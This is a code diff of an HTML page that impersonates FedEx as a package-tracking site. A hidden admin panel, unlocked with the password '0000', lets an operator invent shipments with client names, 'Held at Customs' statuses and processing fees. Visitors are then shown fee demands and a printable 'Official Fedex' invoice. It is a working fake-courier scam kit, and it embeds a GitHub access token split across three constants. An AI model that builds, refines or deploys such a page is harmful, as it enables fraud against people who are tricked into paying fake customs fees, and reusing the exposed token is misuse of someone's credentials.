@@ -7,27 +7,29 @@
     <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
     <style>
         :root { --p: #4D148C; --o: #FF6200; --bg: #f4f4f7; }
-        body { font-family: sans-serif; margin: 0; background: var(--bg); color: #333; }
-        .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:100; }
-        .logo { font-size: 22px; font-weight: 900; cursor: pointer; }
-        .wrapper { padding: 15px; max-width: 480px; margin: auto; }
-        .card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        .btn-o { background: var(--o); color: white; margin-top: 10px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background: var(--bg); color: #333; }
+        .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:100; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { font-size: 24px; font-weight: 900; cursor: pointer; user-select: none; }
+        .wrapper { padding: 15px; max-width: 480px; margin: auto; min-height: 90vh; }
+        .card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); margin-top: 20px; }
+        input, select { width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border-color: var(--o); }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn-o { background: var(--o); color: white; }
+        .btn-o:active { transform: scale(0.98); opacity: 0.9; }
         
-        /* Admin Section - Hidden by default */
-        #admin-panel { display: none; background: #222; color: white; padding: 20px; border-radius: 15px; margin-top: 20px; }
-        #admin-panel input { background: #333; color: white; border: 1px solid #444; }
+        #admin-panel { display: none; background: #1a1a1a; color: white; padding: 20px; border-radius: 15px; margin-top: 20px; border: 2px solid var(--o); }
+        #admin-panel input { background: #2a2a2a; color: white; border: 1px solid #444; }
 
-        /* Results & Invoice */
-        #result { display: none; margin-top: 20px; text-align: left; }
-        .status-bar { padding: 12px; border-radius: 8px; text-align: center; font-weight: bold; margin-bottom: 15px; }
-        .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 14px; }
-        .pkg-img { width: 100%; border-radius: 10px; margin-top: 15px; display: none; }
+        #result { display: none; margin-top: 20px; text-align: left; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         
-        @media print { .nav, .wrapper, .btn, #admin-panel { display: none !important; } #invoice { display: block !important; } }
-        #invoice { display: none; padding: 30px; border: 2px solid #333; }
+        .status-bar { padding: 12px; border-radius: 8px; text-align: center; font-weight: bold; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        .row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
+        .pkg-img { width: 100%; border-radius: 12px; margin-top: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); display: none; }
+        
+        @media print { .nav, .wrapper, .btn, #admin-panel, .card { display: none !important; } #invoice { display: block !important; } }
+        #invoice { display: none; padding: 40px; border: 2px solid #333; font-family: Arial; }
     </style>
 </head>
 <body>
@@ -36,59 +38,64 @@
 
 <div class="nav">
     <div class="logo" onclick="checkAdmin()">Fed<span style="color:var(--o)">ex</span></div>
-    <div style="font-size:12px">Mobile Tracking</div>
+    <div style="font-size:11px; opacity: 0.8;">Secure Tracking</div>
 </div>
 
 <div class="wrapper">
     <div class="card" id="client-view">
-        <h2 style="margin-top:0; color:var(--p)">Track Shipment</h2>
+        <h2 style="margin: 0 0 20px 0; color:var(--p); font-size: 20px;">Track Shipment</h2>
         <input type="text" id="trackInput" placeholder="Enter Tracking Number">
-        <button class="btn btn-o" onclick="startTracking()">TRACK</button>
+        <button class="btn btn-o" onclick="startTracking()">TRACK PACKAGE</button>
 
         <div id="result">
             <div id="st-badge" class="status-bar"></div>
             <div class="row"><span>Recipient:</span> <b id="r-name"></b></div>
             <div class="row"><span>Route:</span> <b id="r-route"></b></div>
-            <div class="row"><span>Arrival:</span> <b id="r-eta"></b></div>
+            <div class="row"><span>Scheduled:</span> <b id="r-eta"></b></div>
             <img id="r-img" class="pkg-img">
             
-            <div id="pay-box" style="display:none; margin-top:20px; padding:15px; background:#fff3cd; border-radius:8px; color:#856404;">
-                <p><b>Required:</b> Clear customs fee of $<span id="r-fee"></span> to release package.</p>
-                <button class="btn" style="background:#333; color:white;" onclick="window.print()">Download Invoice</button>
+            <div id="pay-box" style="display:none; margin-top:20px; padding:20px; background:#fff3cd; border-radius:10px; color:#856404; border-left: 5px solid #ffc107;">
+                <p style="margin:0 0 15px 0;"><b>Clearance Required:</b> A processing fee of $<span id="r-fee"></span> is needed for final release.</p>
+                <button class="btn" style="background:#333; color:white;" onclick="window.print()">DOWNLOAD INVOICE</button>
             </div>
         </div>
     </div>
 
     <div id="admin-panel">
-        <h3>Admin Dashboard</h3>
-        <input type="text" id="a-code" placeholder="Tracking Code">
-        <input type="text" id="a-name" placeholder="Client Name">
-        <input type="text" id="a-origin" placeholder="From City">
-        <input type="text" id="a-dest" placeholder="To City">
-        <input type="text" id="a-eta" placeholder="Delivery Date/Time">
-        <input type="number" id="a-fee" placeholder="Fee (e.g. 150)">
+        <h3 style="color:var(--o); margin-top:0;">Admin Control</h3>
+        <input type="text" id="a-code" placeholder="New Tracking ID">
+        <input type="text" id="a-name" placeholder="Client Full Name">
+        <input type="text" id="a-origin" placeholder="Origin City">
+        <input type="text" id="a-dest" placeholder="Destination City">
+        <input type="text" id="a-eta" placeholder="Est. Arrival Date">
+        <input type="number" id="a-fee" placeholder="Customs Fee (Amount)">
         <select id="a-status">
             <option value="In Transit">In Transit</option>
             <option value="Hold">Hold</option>
             <option value="Held at Customs">Held at Customs</option>
             <option value="Arrived (Payment needed)">Arrived (Payment needed)</option>
         </select>
-        <p style="font-size:12px">Upload Package Photo:</p>
+        <p style="font-size:12px; margin-bottom:5px;">Select Package Photo:</p>
         <input type="file" id="a-file" accept="image/*">
-        <button class="btn btn-o" onclick="uploadData()">SAVE TO CLOUD</button>
-        <button class="btn" style="background:red; color:white; margin-top:10px;" onclick="location.reload()">LOGOUT</button>
+        <button class="btn btn-o" id="saveBtn" onclick="uploadData()">SAVE & PUSH TO CLOUD</button>
+        <button class="btn" style="background:#444; color:white; margin-top:10px;" onclick="location.reload()">LOGOUT</button>
     </div>
 </div>
 
 <div id="invoice">
-    <h1 style="color:#4D148C">Fedex Official Invoice</h1>
-    <hr>
-    <p><b>Tracking:</b> <span id="inv-code"></span></p>
-    <p><b>Customer:</b> <span id="inv-name"></span></p>
-    <p><b>Amount Due:</b> $<span id="inv-fee"></span></p>
-    <p><b>Status:</b> Pending Customs Clearance</p>
-    <br><br>
-    <p><small>Issued on: <span id="inv-date"></span></small></p>
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+        <h1 style="color:#4D148C; margin:0;">Fedex Express</h1>
+        <h2 style="margin:0; color:#666;">INVOICE</h2>
+    </div>
+    <hr style="margin: 20px 0;">
+    <p><b>Tracking ID:</b> <span id="inv-code"></span></p>
+    <p><b>Consignee:</b> <span id="inv-name"></span></p>
+    <p><b>Payment Due:</b> $<span id="inv-fee"></span></p>
+    <p><b>Service:</b> Priority Overnight International</p>
+    <p><b>Issue Date:</b> <span id="inv-date"></span></p>
+    <div style="margin-top: 100px; border-top: 1px dashed #ccc; padding-top: 10px;">
+        <p style="font-size: 12px; text-align: center;">Official Fedex Shipment Document. All rights reserved 2026.</p>
+    </div>
 </div>
 
 <script>
@@ -96,17 +103,16 @@
         new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
     }
 
-    // SECURITY: Update your details here
-    const USER = "YOUR_GITHUB_USERNAME"; // Change this
-    const REPO = "fedex-codetracking";
+    const ACC = "fedex-codetracking"; // Your Username
+    const LIB = "fedex-codetracking"; // Your Repo
     const T1 = "ghp_GPObdZF1wa"; 
     const T2 = "NFIHXvzyspe2zsce"; 
     const T3 = "Ilrq0ZpR57";
-    const TOKEN = T1 + T2 + T3;
+    const G_KEY = T1 + T2 + T3;
 
     function checkAdmin() {
-        if(prompt("Pass:") === "0000") {
-            if(prompt("Token:") === "0000") { // Using 0000 as secondary check
+        if(prompt("Admin Password:") === "0000") {
+            if(prompt("Admin Token:") === "0000") {
                 document.getElementById('client-view').style.display = 'none';
                 document.getElementById('admin-panel').style.display = 'block';
             }
@@ -115,33 +121,38 @@
 
     async function startTracking() {
         const code = document.getElementById('trackInput').value;
-        const res = await fetch(`https://raw.githubusercontent.com/${USER}/${REPO}/main/data.json?v=${Date.now()}`);
-        const data = await res.json();
-        const s = data[code];
+        try {
+            const res = await fetch(`https://raw.githubusercontent.com/${ACC}/${LIB}/main/data.json?nocache=${Date.now()}`);
+            const data = await res.json();
+            const s = data[code];
 
-        if(s) {
-            document.getElementById('result').style.display = 'block';
-            document.getElementById('st-badge').innerText = s.status;
-            document.getElementById('st-badge').style.background = s.status.includes("Arrived") ? "#d4edda" : "#eee";
-            document.getElementById('r-name').innerText = s.name;
-            document.getElementById('r-route').innerText = `${s.origin} to ${s.dest}`;
-            document.getElementById('r-eta').innerText = s.eta;
-            
-            if(s.img) {
-                const img = document.getElementById('r-img');
-                img.src = s.img;
-                img.style.display = 'block';
-            }
+            if(s) {
+                document.getElementById('result').style.display = 'block';
+                const badge = document.getElementById('st-badge');
+                badge.innerText = s.status;
+                badge.style.background = s.status.includes("Arrived") ? "#d4edda" : "#e9ecef";
+                badge.style.color = s.status.includes("Arrived") ? "#155724" : "#495057";
+                
+                document.getElementById('r-name').innerText = s.name;
+                document.getElementById('r-route').innerText = `${s.origin} → ${s.dest}`;
+                document.getElementById('r-eta').innerText = s.eta;
+                
+                if(s.img) {
+                    const img = document.getElementById('r-img');
+                    img.src = s.img;
+                    img.style.display = 'block';
+                }
 
-            if(s.status.includes("Arrived")) {
-                document.getElementById('pay-box').style.display = 'block';
-                document.getElementById('r-fee').innerText = s.fee;
-                document.getElementById('inv-code').innerText = code;
-                document.getElementById('inv-name').innerText = s.name;
-                document.getElementById('inv-fee').innerText = s.fee;
-                document.getElementById('inv-date').innerText = new Date().toLocaleDateString();
-            }
-        } else { alert("Invalid Tracking ID"); }
+                if(s.status.includes("Arrived")) {
+                    document.getElementById('pay-box').style.display = 'block';
+                    document.getElementById('r-fee').innerText = s.fee;
+                    document.getElementById('inv-code').innerText = code;
+                    document.getElementById('inv-name').innerText = s.name;
+                    document.getElementById('inv-fee').innerText = s.fee;
+                    document.getElementById('inv-date').innerText = new Date().toLocaleDateString();
+                }
+            } else { alert("Tracking ID not found in system."); }
+        } catch(e) { alert("Error connecting to database. Make sure data.json exists."); }
     }
 
     function toBase64(file) {
@@ -149,48 +160,58 @@
             const reader = new FileReader();
             reader.readAsDataURL(file);
             reader.onload = () => resolve(reader.result);
-            reader.onerror = error => reject(error);
+            reader.onerror = e => reject(e);
         });
     }
 
     async function uploadData() {
-        const id = document.getElementById('a-code').value;
-        const file = document.getElementById('a-file').files[0];
-        let imgData = "";
-        
-        if(file) { imgData = await toBase64(file); }
+        const btn = document.getElementById('saveBtn');
+        btn.innerText = "UPLOADING...";
+        btn.disabled = true;
 
-        const newData = {
+        const id = document.getElementById('a-code').value;
+        const fileInput = document.getElementById('a-file');
+        let imgBase64 = "";
+        
+        if(fileInput.files.length > 0) {
+            imgBase64 = await toBase64(fileInput.files[0]);
+        }
+
+        const payload = {
             name: document.getElementById('a-name').value,
             origin: document.getElementById('a-origin').value,
             dest: document.getElementById('a-dest').value,
             eta: document.getElementById('a-eta').value,
             status: document.getElementById('a-status').value,
             fee: document.getElementById('a-fee').value,
-            img: imgData,
+            img: imgBase64,
             updated: new Date().toLocaleString()
         };
 
-        const url = `https://api.github.com/repos/${USER}/${REPO}/contents/data.json`;
-        const getFile = await fetch(url);
-        const fileData = await getFile.json();
-        const currentContent = JSON.parse(atob(fileData.content));
+        try {
+            const url = `https://api.github.com/repos/${ACC}/${LIB}/contents/data.json`;
+            const getRes = await fetch(url);
+            const fileMeta = await getRes.json();
+            const db = JSON.parse(atob(fileMeta.content));
 
-        currentContent[id] = newData;
+            db[id] = payload;
 
-        const update = await fetch(url, {
-            method: "PUT",
-            headers: { "Authorization": `token ${TOKEN}` },
-            body: JSON.stringify({
-                message: "Update " + id,
-                content: btoa(JSON.stringify(currentContent, null, 2)),
-                sha: fileData.sha
-            })
-        });
+            const pushRes = await fetch(url, {
+                method: "PUT",
+                headers: { "Authorization": `token ${G_KEY}`, "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    message: `Shipment ${id} updated`,
+                    content: btoa(unescape(encodeURIComponent(JSON.stringify(db, null, 2)))),
+                    sha: fileMeta.sha
+                })
+            });
 
-        if(update.ok) { alert("Successfully Saved to Cloud!"); location.reload(); }
-        else { alert("Error saving. Check your username/repo setting."); }
+            if(pushRes.ok) { alert("Shipment successfully saved to Cloud!"); location.reload(); }
+            else { alert("Cloud update failed. Check your token/repo permissions."); }
+        } catch(e) { alert("Error: " + e.message); }
+        finally { btn.innerText = "SAVE & PUSH TO CLOUD"; btn.disabled = false; }
     }
 </script>
 </body>
-</html>
+    </html>
+    
